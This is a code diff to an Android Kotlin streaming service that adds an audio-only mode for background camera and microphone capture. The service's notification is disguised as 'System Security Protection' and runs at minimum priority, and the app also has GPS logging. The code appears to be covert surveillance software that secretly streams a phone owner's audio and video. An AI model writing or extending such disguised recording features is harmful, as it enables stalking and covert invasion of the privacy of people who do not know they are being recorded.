@@ -26,9 +26,11 @@ class StreamingService : Service() {
         const val NOTIFICATION_ID = 2002
         const val CHANNEL_ID = GpsLoggingService.CHANNEL_ID
         const val EXTRA_ROOM_ID = "extra_room_id"
+        const val EXTRA_STREAM_MODE = "extra_stream_mode"
     }
 
     private var cpuWakeLock: PowerManager.WakeLock? = null
+    private var streamMode: String = "video"
 
     override fun onCreate() {
         super.onCreate()
@@ -54,15 +56,19 @@ class StreamingService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        intent?.getStringExtra(EXTRA_STREAM_MODE)?.let { streamMode = it }
         acquireWakeLock()
         startForegroundWithType()
         return START_NOT_STICKY
     }
 
     private fun startForegroundWithType() {
+        val isAudioOnly = streamMode == "audio_only"
+        val contentDesc = if (isAudioOnly) "백그라운드 보안 음성 연결 유지 중" else "백그라운드 보안 연결 유지 중"
+
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("시스템 보안 보호")
-            .setContentText("백그라운드 보안 연결 유지 중")
+            .setContentText(contentDesc)
             .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
@@ -73,11 +79,16 @@ class StreamingService : Service() {
 
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                val fgsType = if (isAudioOnly) {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                } else {
+                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                }
                 ServiceCompat.startForeground(
                     this,
                     NOTIFICATION_ID,
                     notification,
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    fgsType
                 )
             } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 ServiceCompat.startForeground(
@@ -89,7 +100,7 @@ class StreamingService : Service() {
             } else {
                 startForeground(NOTIFICATION_ID, notification)
             }
-            Log.d(TAG, "StreamingService 포그라운드(카메라/마이크) 등록 완료")
+            Log.d(TAG, "StreamingService 포그라운드 등록 완료 (모드: $streamMode)")
         } catch (e: Exception) {
             Log.e(TAG, "StreamingService startForeground 실패", e)
         }
